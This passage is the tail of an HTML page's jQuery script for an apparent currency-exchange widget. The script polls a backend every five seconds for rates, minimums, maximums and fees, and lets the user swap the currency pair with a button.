			alert('Error:You have selected same icons.');
		}
		
		
	}
	$(document).ready(function(){
	    $(".loader").css({"display": "none"});
	});
	$(document).ready(function(){

      
        
        setInterval(function(){ 
		var currPair = $('#currPair').val();
		ajaxTimer(currPair); 
		}, 5000);


	    $(".my-btn-switch").click(function(){
	        $(".switch-right").toggleClass("pull-right");

            var currPair = $('#currPair').val().split('_');

	        var leftSym = currPair[0];
			var rightSym = currPair[1];
			
			$("#currPair").val(rightSym+'_'+leftSym);
			var Pair = rightSym+'_'+leftSym;
	        
                ajaxTimer(Pair);
           });
	});

function ajaxTimer(Pair){
  
	        

			var dataString = 'action=Swip'+'&Pair='+Pair;
             $.ajax({
				type: "POST",
				url: "ajaxsubmit.php",
				data: dataString,
				success: function(result){
				 
				 var Res = result.split('##');
				 $('.topRate').html(Res[0]);
				 $('.MinVal').html(Res[1]);
				 $('.MaxVal').html(Res[2]);
				 $('.MinnerVal').html(Res[3]);
				 
				 $('#instant_rate').html(Res[4]);
				 $('#deposit_min').html(Res[5]);
				 $('#deposit_max').html(Res[6]);
				 $('#minner_fee').html(Res[7]);
				 

				 
				 
				}
            });

}	
</script>
<script src="js/main.js"></script>
</body>
</html>